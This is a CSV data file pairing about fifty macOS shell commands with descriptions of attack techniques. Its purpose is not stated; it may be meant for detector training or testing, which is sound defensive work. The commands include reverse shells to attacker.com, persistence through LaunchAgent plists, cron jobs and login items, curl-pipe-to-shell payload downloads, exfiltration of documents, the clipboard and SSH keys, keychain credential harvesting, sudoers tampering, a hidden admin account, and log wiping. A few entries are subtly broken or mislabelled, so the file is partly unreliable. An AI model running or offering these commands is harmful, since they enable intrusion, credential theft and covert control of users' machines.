"cmd","description"
"chmod 777 /etc/passwd","Manipulating file permissions to grant world-writable access to a sensitive file."
"sudo chown $(whoami) /etc/sudoers","Changing ownership of sensitive system files to the current user."
"echo '' > /var/log/system.log","Altering system logs to cover tracks after gaining unauthorized access."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.agent</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/curl</string>
 <string>-s</string>
 <string>http://malicious-url.com/payload</string>
 <string>-o</string>
 <string>/tmp/malicious_payload</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist in LaunchAgents"
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/path/to/malicious/script.sh"", hidden:false}'","Adding a Login Item to execute a script on user login"
"sudo mkdir /Library/StartupItems/MaliciousStartupItem && echo '#!/bin/sh

. /etc/rc.common

StartService () {
 /path/to/malicious/script.sh
}

stop_restart () {
 :
}

RunService ""$1""' > /Library/StartupItems/MaliciousStartupItem/MaliciousStartupItem && sudo chmod +x /Library/StartupItems/MaliciousStartupItem/MaliciousStartupItem","Manipulating StartupItems folder to execute malicious code at startup"
"find ~/Documents -type f -name '*.confidential' -exec sh -c 'tar czf - {} | openssl base64' \; | mail -s 'Confidential Data' -r 'spoofed@example.com' recipient@malicious-domain.com","Exfiltrating confidential information from a macOS system by emailing it to an external address using a spoofed sender."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.screencapture</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/screenshotapp</string>
		<string>http://malicious-url.com/trojanapp</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>StartInterval</key>
	<integer>300</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.screencapture.plist && launchctl load ~/Library/LaunchAgents/com.malicious.screencapture.plist","Persistence via malicious plist to install a trojan application that captures screenshots."
"echo 'ALL ALL=(ALL) NOPASSWD: /bin/bash *' | sudo EDITOR='tee -a' visudo","Privilege escalation by exploiting a wildcard misconfiguration in sudoers file."
"echo 'function sudo() { echo ""$@"" > /tmp/credentials; /usr/bin/sudo ""$@""; }' >> ~/.bashrc && source ~/.bashrc","Overriding system commands using function definitions in shell startup files to capture credentials."
"export PATH=/malicious/directory:$PATH","Manipulating environment variables to inject malicious code execution."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/malicious_script.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence by creating a malicious Launch Agent that executes a script on user login."
"curl -s http://malicious-url.com/install.sh | sh","Malware installation using a disguised script from a remote server."
"DYLD_INSERT_LIBRARIES=keylogger.dylib /Applications/TargetApp.app/Contents/MacOS/TargetApp","Injection of a keylogger into an existing process."
"sed -i '' '/malicious/d' /var/log/system.log","Modification of system logs to hide malicious activity."
"sudo tcpdump -i en0 -w ~/Desktop/suspicious_traffic.pcap","Interception of network traffic by unauthorized packet sniffing on a macOS system."
"echo '127.0.0.1 www.legitimatewebsite.com' | sudo tee -a /etc/hosts","Redirection of all web traffic to a malicious site by altering the hosts file."
"networksetup -setdnsservers Wi-Fi 198.51.100.1","DNS hijacking by changing the DNS server settings to point to a malicious server."
"while true; do pbpaste > /tmp/clipboard.txt; sleep 10; done &","Stealth clipboard monitoring through a hidden process on macOS."
"find / -perm +6000 -type f -exec ls -ld {} \;","Identifying setuid and setgid files that could be exploited for privilege escalation."
"curl -s http://phishing-website.com/malicious-install.sh | /bin/bash","Malware installation through a disguised Bash script downloaded from a phishing email attachment."
"find ~/Documents -type f -name '*.doc' -exec openssl rsautl -encrypt -pubin -inkey public.pem -in '{}' -out '{}'.enc \; -exec curl -T '{}'.enc http://malicious-server.com/upload \;","Automatic transmission of documents with encryption using public key before exfiltration on a macOS system."
"chmod 000 /var/log/system.log","Altering system logs permissions to prevent logging of future actions."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.mykeylogger.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/mykeylogger</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>StartInterval</key>
	<integer>300</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.mykeylogger.agent.plist && launchctl load ~/Library/LaunchAgents/com.mykeylogger.agent.plist","Persistence of a keylogger by modifying launchd services."
"echo '#!/bin/bash
while true; do
 security find-generic-password -wa """" 2>&1 > /tmp/credentials.txt
 sleep 300
done' > ~/Library/Scripts/credentialHarvester.sh && chmod +x ~/Library/Scripts/credentialHarvester.sh && ~/Library/Scripts/credentialHarvester.sh &","Interception of login credentials using a malicious shell script."
"echo '#!/bin/bash
while true; do
 pbpaste > /tmp/clipboard.txt
 curl -X POST -F ""file=@/tmp/clipboard.txt"" http://attacker.com/upload
 sleep 60
done' > ~/Library/Scripts/clipboardMonitor.sh && chmod +x ~/Library/Scripts/clipboardMonitor.sh && ~/Library/Scripts/clipboardMonitor.sh &","Capturing clipboard data periodically and sending it to a remote server."
"while read -r line; do echo $line | nc -w1 attacker.com 4444; done < /dev/input/event0","Data exfiltration through keylogging to capture user input events and record application usage."
"echo '*/5 * * * * /usr/bin/python /tmp/rootkit.py' | sudo crontab -","Privilege escalation by injecting malicious code into root's crontab for persistence."
"find / -perm -4002 -type f -exec ls -la {} \;","Privilege escalation by finding and exploiting world-writable setuid files."
"ps aux | grep 'process_name' | awk '{print $2}' | xargs kill -9","Malicious shell command that enumerates running processes and selects specific ones to terminate, potentially disrupting critical system services."
"open -a /Applications/Mail.app /path/to/malicious/payload.eml && osascript -e 'tell application ""Mail"" to open (get mail attachments of incoming message 1 whose name is ""payload.zip"")' && unzip ~/Downloads/payload.zip -d ~/Library/ && chmod +x ~/Library/payload.app/Contents/MacOS/payload && ~/Library/payload.app/Contents/MacOS/payload","Infection of a macOS system by executing a malicious payload received through a phishing email."
"osascript -e 'do shell script ""launchctl setenv DYLD_INSERT_LIBRARIES /path/to/malicious.dylib"" with administrator privileges'","Privilege escalation by injecting code into privileged processes on macOS systems."
"echo 'echo ""rootmydevice"" | sudo -S /usr/bin/kextload /tmp/exploit.kext' > /tmp/execute.sh && chmod +x /tmp/execute.sh && /tmp/execute.sh","Executing a kernel exploit payload to gain unauthorized access."
"csrutil disable","Bypassing System Integrity Protection (SIP) to perform restricted operations."
"while true; do rsync -a --exclude '.DS_Store' /Volumes/USBDrive/ user@remote-server:/path/to/backup; sleep 300; done","Malicious script that monitors the file system for changes and copies newly added files to a remote server."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.reverse.shell</string>
 <key>ProgramArguments</key>
 <array>
 <string>/bin/bash</string>
 <string>-c</string>
 <string>/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load ~/Library/LaunchAgents/com.reverse.shell.plist","Persistence via launchd to establish a reverse shell on system startup."
"curl -s http://compromised-website.com/trojan.pkg > /tmp/trojan.pkg && installer -pkg /tmp/trojan.pkg -target /","A scenario where a trojan application is installed on a macOS system through a compromised website."
"zip -r .hidden.zip ~/Documents/.hidden && mv .hidden.zip ~/Pictures/.image.jpg","Compressing sensitive files in a hidden directory before exfiltration."
"cat ~/Pictures/.image.jpg ~/Documents/.hidden.zip > ~/Pictures/transfer_image.jpg","Hiding files in image metadata for stealthy information transfer."
"curl -F 'media=@/Pictures/transfer_image.jpg' 'https://upload.twitter.com/1.1/media/upload.json' -H 'Authorization: Bearer [ACCESS_TOKEN]'","Uploading a file to a social media platform using curl for data exfiltration."
"echo ""*/30 * * * * /usr/bin/curl http://malicious-url.com/payload.sh | /bin/bash"" | crontab -","Persistence mechanism using a cron job to download and execute a script from a remote server on a macOS system."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist file to establish a reverse shell on system boot."
"scp ~/.ssh/id_rsa user@malicious-server.com:/path/to/store/keys","Data exfiltration by sending local SSH private keys to a remote server."
"bash -i >& /dev/tcp/attacker.com/4444 0>&1","Setting up remote access by creating a reverse shell using bash."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>\n<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">\n<plist version=""1.0"">\n<dict>\n	<key>Label</key>\n	<string>com.malicious.agent</string>\n	<key>ProgramArguments</key>\n	<array>\n		<string>/usr/bin/curl</string>\n		<string>-fsSL</string>\n		<string>http://malicious-url.com/payload.sh</string>\n		<string>|</string>\n		<string>/bin/bash</string>\n	</array>\n	<key>RunAtLoad</key>\n	<true/>\n</dict>\n</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Creating a persistent backdoor by adding a launch agent."
"echo ""0 * * * * curl -fsSL http://malicious-url.com/payload.sh | sh"" | crontab -","Persistence via a malicious cron job that downloads and executes a script every hour."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/path/to/malicious/script"", hidden:false}'","Persistence by adding a malicious script to login items."
"sudo dscl . -create /Users/hiddenadmin && sudo dscl . -create /Users/hiddenadmin UserShell /bin/bash && sudo dscl . -create /Users/hiddenadmin RealName 'Hidden Admin' && sudo dscl . -create /Users/hiddenadmin UniqueID '999' && sudo dscl . -create /Users/hiddenadmin PrimaryGroupID 80 && sudo dscl . -create /Users/hiddenadmin NFSHomeDirectory /var/hiddenadmin && sudo dscl . -passwd /Users/hiddenadmin password && sudo dscl . -append /Groups/admin GroupMembership hiddenadmin","Establishing unauthorized system access by creating a hidden admin user."
"sudo launchctl load -w /Library/LaunchDaemons/com.malicious.daemon.plist","Daemon registration to maintain persistence after reboot."
"script -q /dev/null | tee ~/Library/Logs/user_activity.log","Tracking user activity by logging every command entered in the terminal."
"osascript -e 'tell application ""System Events"" to make login item at end with properties {path:""/Applications/malicious.app"", hidden:false}'","Persistence via login item added to a user's Login Items list using AppleScript."
"echo 'int main() { system(""launchctl load /Library/LaunchDaemons/com.malicious.plist""); return 0; }' > malicious.c && gcc -dynamiclib -o libmalicious.dylib malicious.c && sudo DYLD_INSERT_LIBRARIES=./libmalicious.dylib /usr/bin/someprivilegedprocess","Injecting code into privileged processes can be achieved by creating a malicious dynamic library and using DYLD_INSERT_LIBRARIES to preload it."
"sudo sed -i '' 's|</dict>|<key>ProgramArguments</key><array><string>/bin/sh</string><string>-c</string><string>nohup curl -fsSL http://malicious-url.com/payload.sh | sh</string></array></dict>|' /Library/LaunchDaemons/com.apple.someexistingdaemon.plist","Manipulating system daemons to execute arbitrary code can be done by altering existing plist files in the LaunchDaemons directory."
"echo 'username ALL=(ALL) NOPASSWD:ALL' | sudo EDITOR='tee -a' visudo","Tampering with the sudoers file to grant no-password sudo access to a specific user can be done by editing the sudoers file directly."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/payload</string>
		<string>http://malicious-url.com/payload</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load -w ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence mechanism using a malicious Launch Agent to execute a payload every time the user logs in."
